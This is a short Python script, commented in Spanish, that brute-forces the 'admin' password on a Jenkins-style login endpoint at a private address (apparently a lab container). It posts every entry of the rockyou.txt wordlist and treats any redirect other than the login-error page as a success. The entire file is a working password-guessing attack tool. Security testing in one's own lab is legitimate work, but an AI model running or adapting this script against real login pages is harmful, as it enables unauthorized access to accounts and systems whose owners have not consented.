import requests

# archivo de diccionario con los passwords
PASSWORDS_FILE = "/usr/share/wordlists/rockyou.txt"

# url de autenticación
URL = "http://172.17.0.2:8080/j_spring_security_check"

# usuario fijo
USERNAME = "admin"

# leer el archivo del diccionario
with open(PASSWORDS_FILE, 'r', encoding='utf-8') as file:
    for line in file:
        password = line.strip()  # elimina espacios en blanco

        # hacer la solicitud con la contraseña actual
        response = requests.post(
            URL,
            data={
                'j_username': USERNAME,
                'j_password': password,
                'from': '/',
                'Submit': ''
            },
            headers={
                'Content-Type': 'application/x-www-form-urlencoded'
            },
            allow_redirects=False  # no seguir redirecciones 
        )

        # imprimir el password que se esta probando
        print(f"Probando el password: {password}")

        # Comprueba si se da con exito
        if response.headers['Location'] != 'http://172.17.0.2:8080/loginError':
            print(f"Password Encontrada!!!!!!: {password}")
            break

print("Se finalizo los intentos.")